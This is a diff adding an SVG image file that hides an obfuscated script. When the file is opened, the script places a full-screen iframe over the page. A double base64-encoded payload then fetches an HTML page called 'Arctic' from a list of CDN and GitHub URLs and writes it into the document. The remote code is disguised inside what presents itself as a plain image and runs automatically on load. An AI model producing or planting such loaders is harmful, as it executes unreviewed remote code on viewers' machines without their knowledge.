@@ -1,0 +1,11 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" style="position: fixed; top: 0; left: 0;">
+<style>[...]</style>
+  <foreignObject x="0" y="0" width="100%" height="100%">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+	 <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;" id="test"></iframe>
+         <script>let l = atob("PHNjcmlwdD4oKCk9PntsZXQgYT1hdG9iKCJhSFIwY0hNNkx5OTBaWE4wYVc1blkyWXVhbk5rWld4cGRuSXVibVYwTDJkb0wzTmxZV3hwWldVeE1TOWhjbU4wYVdOQWJXRnBiaTlwYm1SbGVDNW9kRzFzZkdoMGRIQnpPaTh2WTJSdUxtcHpaR1ZzYVhaeUxtNWxkQzluYUM5elpXRnNhV1ZsTVRFdllYSmpkR2xqUUcxaGFXNHZhVzVrWlhndWFIUnRiSHhvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZjMlZoYkdsbFpURXhMMkZ5WTNScFl5OXRZV2x1TDJsdVpHVjRMbWgwYld4OGFIUjBjSE02THk5alpHNHVjM1JoZEdsallXeHNlUzVwYnk5bmFDOXpaV0ZzYVdWbE1URXZZWEpqZEdsalFHMWhhVzR2YVc1a1pYZ3VhSFJ0YkE9PSIpLnNwbGl0KCJ8IiksaT0wLGY9KCk9PntsZXQgdT1hW2krK10sYz1uZXcgQWJvcnRDb250cm9sbGVyLHM9c2V0VGltZW91dCgoKT0+Yy5hYm9ydCgpLDdlMyk7ZmV0Y2godSx7c2lnbmFsOmMuc2lnbmFsfSkudGhlbihyPT5yLnRleHQoKSkudGhlbihoPT57aWYoIWguaW5jbHVkZXMoImFyY3RpYy1yb290IikpdGhyb3cgMDtoPWgucmVwbGFjZSgvPGhlYWQ+L2ksJzxoZWFkPjxiYXNlIGhyZWY9IicrbmV3IFVSTCgiLiIsdSkrJyI+Jyk7Y2xlYXJUaW1lb3V0KHMpO2RvY3VtZW50Lm9wZW4oKTtkb2N1bWVudC53cml0ZShoKTtkb2N1bWVudC5jbG9zZSgpfSkuY2F0Y2goKCk9PntjbGVhclRpbWVvdXQocyk7aTxhLmxlbmd0aD9mKCk6ZG9jdW1lbnQuYm9keS5pbm5lclRleHQ9IkNvdWxkIG5vdCBsb2FkIEFyY3RpYy4ifSl9O2YoKX0pKCk8L3NjcmlwdD4K"); var theIframe = document.getElementById('test'); theIframe.srcdoc = l;</script>
+    </body>
+  </foreignObject>
+      <script xmlns="http://www.w3.org/2000/svg"><![CDATA[...]]></script>
+</svg>
